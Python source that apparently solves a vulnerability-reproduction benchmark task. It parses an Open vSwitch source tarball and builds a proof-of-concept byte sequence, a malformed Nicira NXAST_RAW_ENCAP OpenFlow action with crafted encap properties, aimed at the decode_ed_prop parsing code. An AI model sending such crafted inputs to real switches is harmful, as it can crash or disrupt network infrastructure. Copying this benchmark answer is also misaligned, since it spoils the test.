import os
import re
import struct
import tarfile
from typing import Dict, List, Optional, Tuple


def _be16(x: int) -> bytes:
    return struct.pack("!H", x & 0xFFFF)


def _be32(x: int) -> bytes:
    return struct.pack("!I", x & 0xFFFFFFFF)


def _align8(n: int) -> int:
    return (n + 7) & ~7


def _strip_c_comments(s: str) -> str:
    out = []
    i = 0
    n = len(s)
    state = 0  # 0 code, 1 line, 2 block
    while i < n:
        c = s[i]
        if state == 0:
            if c == "/" and i + 1 < n:
                d = s[i + 1]
                if d == "/":
                    state = 1
                    i += 2
                    continue
                if d == "*":
                    state = 2
                    i += 2
                    continue
            out.append(c)
            i += 1
        elif state == 1:
            if c == "\n":
                out.append(c)
                state = 0
            i += 1
        else:
            if c == "*" and i + 1 < n and s[i + 1] == "/":
                state = 0
                i += 2
            else:
                i += 1
    return "".join(out)


def _extract_brace_block(s: str, brace_start: int) -> str:
    n = len(s)
    i = brace_start
    depth = 0
    state = 0  # 0 code, 1 str, 2 char
    escape = False
    while i < n:
        c = s[i]
        if state == 0:
            if c == '"':
                state = 1
                escape = False
            elif c == "'":
                state = 2
                escape = False
            elif c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return s[brace_start : i + 1]
        elif state == 1:
            if escape:
                escape = False
            elif c == "\\":
                escape = True
            elif c == '"':
                state = 0
        else:
            if escape:
                escape = False
            elif c == "\\":
                escape = True
            elif c == "'":
                state = 0
        i += 1
    return s[brace_start:]


def _find_struct_def(text: str, struct_name: str) -> Optional[str]:
    t = _strip_c_comments(text)
    m = re.search(r"\bstruct\s+" + re.escape(struct_name) + r"\s*\{", t)
    if not m:
        return None
    brace_pos = t.find("{", m.end() - 1)
    if brace_pos < 0:
        return None
    block = _extract_brace_block(t, brace_pos)
    end_pos = brace_pos + len(block)
    tail = t[end_pos : end_pos + 8]
    if "};" in tail:
        return "struct " + struct_name + " " + block + ";"
    return "struct " + struct_name + " " + block + ";"


def _parse_ofp_assert_sizes(text: str) -> Dict[str, int]:
    sizes: Dict[str, int] = {}
    t = _strip_c_comments(text)
    for m in re.finditer(
        r"OFP_ASSERT\s*\(\s*sizeof\s*\(\s*struct\s+(\w+)\s*\)\s*==\s*(\d+)\s*\)\s*;",
        t,
    ):
        sizes[m.group(1)] = int(m.group(2))
    return sizes


def _parse_defines_and_enums(text: str) -> Dict[str, int]:
    vals: Dict[str, int] = {}
    t = _strip_c_comments(text)

    # Simple #defines with numeric literals.
    for m in re.finditer(
        r"^\s*#\s*define\s+(\w+)\s+((?:0x[0-9a-fA-F]+)|(?:\d+))\b",
        t,
        flags=re.MULTILINE,
    ):
        name = m.group(1)
        lit = m.group(2)
        try:
            vals[name] = int(lit, 0)
        except Exception:
            pass

    # Enums (support implicit increments, numeric assignments only).
    for em in re.finditer(r"\benum\b[^{]*\{", t):
        brace_pos = t.find("{", em.end() - 1)
        if brace_pos < 0:
            continue
        block = _extract_brace_block(t, brace_pos)
        body = block[1:-1]
        items = [x.strip() for x in body.split(",")]
        cur = -1
        for it in items:
            if not it:
                continue
            if it.startswith("#"):
                continue
            # Remove possible trailing attributes.
            it = it.strip()
            if not it:
                continue
            m = re.match(r"^(\w+)\s*(?:=\s*([^/]+))?$", it)
            if not m:
                continue
            name = m.group(1)
            rhs = m.group(2)
            if rhs is not None:
                rhs = rhs.strip()
                rhs_m = re.match(r"^(0x[0-9a-fA-F]+|\d+)\b", rhs)
                if rhs_m:
                    try:
                        cur = int(rhs_m.group(1), 0)
                        vals[name] = cur
                        continue
                    except Exception:
                        pass
                # Non-numeric assignment; stop tracking cur reliably.
                cur = cur + 1
                continue
            else:
                cur = cur + 1
                vals[name] = cur
    return vals


def _type_size(type_str: str, size_map: Dict[str, int]) -> Optional[int]:
    t = type_str.strip()
    t = re.sub(r"\b(const|volatile|register|static|extern)\b", "", t).strip()
    t = re.sub(r"\s+", " ", t)

    # Common wire types.
    if "ovs_be16" in t:
        return 2
    if "ovs_be32" in t:
        return 4
    if "ovs_be64" in t:
        return 8

    # Standard types.
    if re.search(r"\buint8_t\b", t) or re.search(r"\bint8_t\b", t):
        return 1
    if re.search(r"\buint16_t\b", t) or re.search(r"\bint16_t\b", t):
        return 2
    if re.search(r"\buint32_t\b", t) or re.search(r"\bint32_t\b", t):
        return 4
    if re.search(r"\buint64_t\b", t) or re.search(r"\bint64_t\b", t):
        return 8

    sm = re.match(r"^struct\s+(\w+)$", t)
    if sm:
        return size_map.get(sm.group(1))
    return None


def _pack_int_be(nbytes: int, v: int) -> bytes:
    if nbytes == 1:
        return bytes([v & 0xFF])
    if nbytes == 2:
        return _be16(v)
    if nbytes == 4:
        return _be32(v)
    if nbytes == 8:
        return struct.pack("!Q", v & 0xFFFFFFFFFFFFFFFF)
    return b"\x00" * nbytes


def _parse_struct_layout(struct_def: str, size_map: Dict[str, int]) -> List[Tuple[str, str, int, int, Optional[int]]]:
    # Returns list of fields: (name, type_str, size, offset, array_len or None)
    # Stops at first flexible array (len 0 or empty []) because trailing variable data.
    m = re.search(r"\{(.*)\}", struct_def, flags=re.DOTALL)
    if not m:
        return []
    body = m.group(1)
    body = body.replace("\n", " ")
    body = re.sub(r"\s+", " ", body).strip()
    decls = [d.strip() for d in body.split(";") if d.strip()]
    fields: List[Tuple[str, str, int, int, Optional[int]]] = []
    off = 0

    for decl in decls:
        # Skip nested struct/union definitions.
        if "{" in decl or "}" in decl:
            continue
        decl = re.sub(r"\bOVS_PACKED\b", "", decl)
        decl = re.sub(r"\bOVS_ALIGNED\([^)]*\)\b", "", decl)
        decl = decl.strip()
        if not decl:
            continue

        # Handle multiple declarators: "uint8_t a, b[2]"
        # Determine base type by splitting at first space that separates type from declarators.
        # For "struct X y", base type includes "struct X".
        # We'll try to match: (type) (rest)
        mm = re.match(r"^(struct\s+\w+|[\w\s\*]+?)\s+(.+)$", decl)
        if not mm:
            continue
        base_type = mm.group(1).strip()
        rest = mm.group(2).strip()
        declarators = [r.strip() for r in rest.split(",") if r.strip()]
        for dec in declarators:
            # Skip pointers.
            if "*" in dec:
                continue
            am = re.match(r"^(\w+)\s*\[\s*(\d*)\s*\]$", dec)
            if am:
                name = am.group(1)
                alen_s = am.group(2)
                if alen_s == "":
                    # flexible array
                    return fields
                alen = int(alen_s) if alen_s else 0
                if alen == 0:
                    return fields
                tsz = _type_size(base_type, size_map)
                if tsz is None:
                    continue
                fields.append((name, base_type, tsz * alen, off, alen))
                off += tsz * alen
            else:
                sm = re.match(r"^(\w+)$", dec)
                if not sm:
                    continue
                name = sm.group(1)
                tsz = _type_size(base_type, size_map)
                if tsz is None:
                    continue
                fields.append((name, base_type, tsz, off, None))
                off += tsz

    return fields


def _find_file_members_by_suffix(tar: tarfile.TarFile, suffix: str) -> List[tarfile.TarInfo]:
    out = []
    for m in tar.getmembers():
        if m.isfile() and m.name.endswith(suffix):
            out.append(m)
    return out


def _read_member_text(tar: tarfile.TarFile, member: tarfile.TarInfo, max_bytes: Optional[int] = None) -> str:
    f = tar.extractfile(member)
    if f is None:
        return ""
    data = f.read() if max_bytes is None else f.read(max_bytes)
    try:
        return data.decode("utf-8", "ignore")
    except Exception:
        return data.decode("latin1", "ignore")


def _find_any_member_containing(tar: tarfile.TarFile, token: str, exts: Tuple[str, ...]) -> List[tarfile.TarInfo]:
    res = []
    tokb = token.encode("utf-8")
    for m in tar.getmembers():
        if not m.isfile():
            continue
        if not any(m.name.endswith(e) for e in exts):
            continue
        if m.size <= 0 or m.size > 5_000_000:
            continue
        f = tar.extractfile(m)
        if not f:
            continue
        data = f.read()
        if tokb in data:
            res.append(m)
    return res


class Solution:
    def solve(self, src_path: str) -> bytes:
        nx_vendor_id = 0x00002320
        nxast_raw_encap = None

        ofp_actions_text = ""
        header_texts: List[str] = []
        size_map: Dict[str, int] = {}
        const_map: Dict[str, int] = {}

        if os.path.isdir(src_path):
            # Directory fallback (rare).
            for root, _, files in os.walk(src_path):
                for fn in files:
                    p = os.path.join(root, fn)
                    if fn == "ofp-actions.c":
                        try:
                            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                                ofp_actions_text = f.read()
                        except Exception:
                            pass
                    if fn.endswith(".h") or fn.endswith(".c"):
                        try:
                            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                                txt = f.read()
                            if "NXAST_RAW_ENCAP" in txt or "NX_ED_PROP" in txt or "nx_action_raw_encap" in txt:
                                header_texts.append(txt)
                            size_map.update(_parse_ofp_assert_sizes(txt))
                            const_map.update(_parse_defines_and_enums(txt))
                        except Exception:
                            pass
        else:
            with tarfile.open(src_path, "r:*") as tar:
                # Prefer lib/ofp-actions.c
                cands = _find_file_members_by_suffix(tar, "ofp-actions.c")
                if cands:
                    # Prefer the one under lib/
                    chosen = None
                    for m in cands:
                        if "/lib/" in ("/" + m.name):
                            chosen = m
                            break
                    if chosen is None:
                        chosen = cands[0]
                    ofp_actions_text = _read_member_text(tar, chosen)

                # Pull headers likely to contain definitions.
                hdr_members = _find_any_member_containing(
                    tar, "NXAST_RAW_ENCAP", (".h", ".c")
                )
                if not hdr_members:
                    hdr_members = _find_any_member_containing(
                        tar, "NX_ED_PROP", (".h", ".c")
                    )
                if not hdr_members:
                    hdr_members = _find_any_member_containing(
                        tar, "nx_action_raw_encap", (".h", ".c")
                    )

                # Always include nicira-ext.h if present.
                nicira = _find_file_members_by_suffix(tar, "nicira-ext.h")
                if nicira:
                    hdr_members = nicira + hdr_members

                seen = set()
                for m in hdr_members:
                    if m.name in seen:
                        continue
                    seen.add(m.name)
                    txt = _read_member_text(tar, m)
                    header_texts.append(txt)
                    size_map.update(_parse_ofp_assert_sizes(txt))
                    const_map.update(_parse_defines_and_enums(txt))

                # Also parse sizes/consts from ofp-actions.c, as a fallback.
                if ofp_actions_text:
                    size_map.update(_parse_ofp_assert_sizes(ofp_actions_text))
                    const_map.update(_parse_defines_and_enums(ofp_actions_text))

        if "NX_VENDOR_ID" in const_map:
            nx_vendor_id = const_map["NX_VENDOR_ID"]
        if "NXAST_RAW_ENCAP" in const_map:
            nxast_raw_encap = const_map["NXAST_RAW_ENCAP"]

        # Extract decode_ed_prop case labels as candidates.
        decode_cases: List[str] = []
        if ofp_actions_text:
            ctext = _strip_c_comments(ofp_actions_text)
            mi = re.search(r"\bdecode_ed_prop\s*\(", ctext)
            if mi:
                brace_pos = ctext.find("{", mi.end())
                if brace_pos >= 0:
                    body = _extract_brace_block(ctext, brace_pos)
                    decode_cases = re.findall(r"\bcase\s+([A-Z0-9_]+)\s*:", body)

        prop_candidates = [c for c in decode_cases if c.startswith("NX_ED_PROP_")]
        # Ensure candidate has numeric value.
        prop_candidates = [c for c in prop_candidates if c in const_map]

        # Identify action wire struct used, try nx_action_raw_encap.
        action_struct_name = "nx_action_raw_encap"
        if ofp_actions_text:
            ctext = _strip_c_comments(ofp_actions_text)
            mj = re.search(r"\bdecode_NXAST_RAW_ENCAP\s*\(", ctext)
            if mj:
                brace_pos = ctext.find("{", mj.end())
                if brace_pos >= 0:
                    body = _extract_brace_block(ctext, brace_pos)
                    # Find cast "const struct X *" to infer struct name.
                    mm = re.search(r"\bconst\s+struct\s+(\w+)\s*\*\s*\w+\s*=\s*\(const\s+struct\s+\1\s*\*\)", body)
                    if mm:
                        action_struct_name = mm.group(1)
                    else:
                        # Or any mention "struct <name> *...raw_encap"
                        mm2 = re.search(r"\bstruct\s+(\w+)\s*\*\s*\w*raw_encap\w*\s*=", body)
                        if mm2:
                            action_struct_name = mm2.group(1)

        combined_headers = "\n".join(header_texts)

        # Ensure we have action subtype.
        if nxast_raw_encap is None:
            # Try to parse from combined headers if it wasn't already.
            tmp = _parse_defines_and_enums(combined_headers)
            if "NXAST_RAW_ENCAP" in tmp:
                nxast_raw_encap = tmp["NXAST_RAW_ENCAP"]
            else:
                # Last-resort guess (rare): common OVS value ranges; keep nonzero.
                nxast_raw_encap = 47

        # Get action struct definition and base size.
        action_def = _find_struct_def(combined_headers, action_struct_name)
        if action_def is None and ofp_actions_text:
            action_def = _find_struct_def(ofp_actions_text, action_struct_name)

        if action_def is None and action_struct_name != "nx_action_raw_encap":
            action_struct_name = "nx_action_raw_encap"
            action_def = _find_struct_def(combined_headers, action_struct_name)
            if action_def is None and ofp_actions_text:
                action_def = _find_struct_def(ofp_actions_text, action_struct_name)

        # Commonly asserted.
        base_size = size_map.get(action_struct_name)
        if base_size is None:
            # Compute approximate packed size.
            if action_def:
                layout = _parse_struct_layout(action_def, size_map)
                base_size = 0
                for _, _, sz, off, _ in layout:
                    base_size = max(base_size, off + sz)
                # Ensure at least NX header (16) + 8 (common)
                base_size = max(base_size, 24)
            else:
                base_size = 24

        # Identify the nested NX action header field name (for placing 16-byte header).
        action_layout = _parse_struct_layout(action_def, size_map) if action_def else []
        nx_header_field = None
        for fname, ftype, fsz, off, alen in action_layout:
            if alen is not None:
                continue
            if off == 0 and fsz == 16 and re.match(r"^struct\s+nx_action_header$", ftype.strip()):
                nx_header_field = fname
                break
            if off == 0 and fsz == 16 and ("nx_action_header" in ftype):
                nx_header_field = fname
                break
        if nx_header_field is None:
            # Many structs use 'hdr' at offset 0.
            nx_header_field = "hdr"

        # Property selection
        def _derive_prop_struct_name(prop_const: str) -> str:
            suf = prop_const[len("NX_ED_PROP_") :]
            return "nx_ed_prop_" + suf.lower()

        chosen_prop_const = None
        # Prefer HEADER-like.
        for cand in prop_candidates:
            if "HEADER" in cand:
                chosen_prop_const = cand
                break
        if chosen_prop_const is None and prop_candidates:
            chosen_prop_const = prop_candidates[0]
        if chosen_prop_const is None:
            # Try to find any NX_ED_PROP_ definition with numeric.
            for k in const_map.keys():
                if k.startswith("NX_ED_PROP_"):
                    chosen_prop_const = k
                    break
        if chosen_prop_const is None:
            chosen_prop_const = "NX_ED_PROP_HEADER"
            const_map.setdefault(chosen_prop_const, 1)

        prop_type_val = const_map.get(chosen_prop_const, 1)
        prop_struct_name = _derive_prop_struct_name(chosen_prop_const)

        prop_def = _find_struct_def(combined_headers, prop_struct_name)
        if prop_def is None and ofp_actions_text:
            prop_def = _find_struct_def(ofp_actions_text, prop_struct_name)

        prop_min_size = size_map.get(prop_struct_name)
        if prop_min_size is None:
            if prop_def:
                pl = _parse_struct_layout(prop_def, size_map)
                prop_min_size = 0
                for _, _, sz, off, _ in pl:
                    prop_min_size = max(prop_min_size, off + sz)
            else:
                prop_min_size = 8

        # Detect flexible array in property struct
        prop_is_var = False
        if prop_def:
            if re.search(r"\[\s*0\s*\]", prop_def) or re.search(r"\[\s*\]", prop_def):
                prop_is_var = True

        # Determine property header size (nx_ed_prop_header) if asserted, else assume 4.
        ed_hdr_size = size_map.get("nx_ed_prop_header", 4)
        ed_hdr_size = 4 if ed_hdr_size not in (4, 8, 12, 16) else ed_hdr_size

        # Target total input length 72, if we can.
        target_total = 72
        target_props_bytes = target_total - base_size
        if target_props_bytes < 8:
            target_total = _align8(base_size + 48)
            target_props_bytes = target_total - base_size

        props_bytes = b""
        n_props = 1

        if prop_is_var:
            prop_len = _align8(max(prop_min_size, target_props_bytes))
            if prop_len < 8:
                prop_len = 8
            # Keep total length reasonable and aligned.
            total_len = _align8(base_size + prop_len)
            if total_len != base_size + prop_len:
                prop_len = total_len - base_size
            n_props = 1

            pb = bytearray(prop_len)
            # Try to place type/len either via struct header field or at offset 0.
            # Most likely it's at offset 0 (struct nx_ed_prop_header).
            pb[0:2] = _be16(prop_type_val)
            pb[2:4] = _be16(prop_len)

            # Add a plausible Ethernet header into the payload area (after min fixed part).
            payload_off = max(ed_hdr_size, min(prop_min_size, prop_len))
            if payload_off < prop_len:
                payload = pb[payload_off:]
                # dst ff:ff:ff:ff:ff:ff, src 00:11:22:33:44:55, ethertype 0x0800
                eth = b"\xff" * 6 + b"\x00\x11\x22\x33\x44\x55" + b"\x08\x00"
                payload[: min(len(payload), len(eth))] = eth[: min(len(payload), len(eth))]
                # Fill remaining with a pattern.
                for i in range(payload_off + len(eth), prop_len):
                    pb[i] = 0x41
            props_bytes = bytes(pb)
        else:
            # Prefer fixed-size properties that fit exactly into target.
            # If chosen property isn't 8-byte, still attempt repetition or adjust total length.
            fixed_len = int(prop_min_size) if prop_min_size else 8
            if fixed_len < 8 or fixed_len % 4 != 0:
                fixed_len = 8
            if target_props_bytes > 0 and target_props_bytes % fixed_len == 0:
                n_props = target_props_bytes // fixed_len
                total_len = base_size + n_props * fixed_len
            else:
                # Force at least 6 properties of 8 bytes.
                fixed_len = 8
                n_props = 6
                total_len = _align8(base_size + n_props * fixed_len)

            pb = bytearray(n_props * fixed_len)
            for i in range(n_props):
                off = i * fixed_len
                pb[off + 0 : off + 2] = _be16(prop_type_val)
                pb[off + 2 : off + 4] = _be16(fixed_len)
                # Fill a plausible small value.
                # If this is a port-like property, use port 1; else just nonzero.
                v = 1
                if "PORT" in chosen_prop_const or "OFPORT" in chosen_prop_const:
                    pb[off + 4 : off + 6] = _be16(1)
                    pb[off + 6 : off + 8] = b"\x00\x00"
                elif "ETH_TYPE" in chosen_prop_const or "ETHERTYPE" in chosen_prop_const:
                    pb[off + 4 : off + 6] = _be16(0x0800)
                    pb[off + 6 : off + 8] = b"\x00\x00"
                else:
                    pb[off + 4 : off + 8] = _be32(v)
            props_bytes = bytes(pb)

        total_len = base_size + len(props_bytes)
        total_len = _align8(total_len)
        if total_len != base_size + len(props_bytes):
            props_bytes += b"\x00" * (total_len - (base_size + len(props_bytes)))

        # Build NX action header (16 bytes).
        nx_hdr = _be16(0xFFFF) + _be16(total_len) + _be32(nx_vendor_id) + _be16(int(nxast_raw_encap)) + b"\x00\x00"

        # Build base action struct bytes.
        base = bytearray(base_size)
        # Place header at offset 0 (most likely).
        base[0:16] = nx_hdr

        # Set fields such as n_props, props_len, packet_type if present.
        # Use parsed layout to write values at appropriate offsets.
        if action_layout:
            for fname, ftype, fsz, off, alen in action_layout:
                if alen is not None:
                    continue
                name_l = fname.lower()
                if off == 0 and fsz == 16 and ("nx_action_header" in ftype):
                    base[off : off + 16] = nx_hdr
                    continue
                # Heuristics for common fields
                if ("n_props" in name_l or "nprop" in name_l or name_l == "n") and fsz in (2, 4, 8):
                    base[off : off + fsz] = _pack_int_be(fsz, n_props)
                elif ("props_len" in name_l or "prop_len" in name_l or "properties_len" in name_l) and fsz in (2, 4):
                    base[off : off + fsz] = _pack_int_be(fsz, len(props_bytes))
                elif "packet_type" in name_l and fsz in (4, 2):
                    # 0 is typically Ethernet in OVS's packet_type encoding.
                    base[off : off + fsz] = _pack_int_be(fsz, 0)

        else:
            # Common layout fallback: hdr(16) + packet_type(4) + n_props(2) + pad(2)
            if base_size >= 24:
                base[16:20] = _be32(0)
                base[20:22] = _be16(n_props)
                base[22:24] = b"\x00\x00"

        poc = bytes(base) + props_bytes
        return poc[:total_len]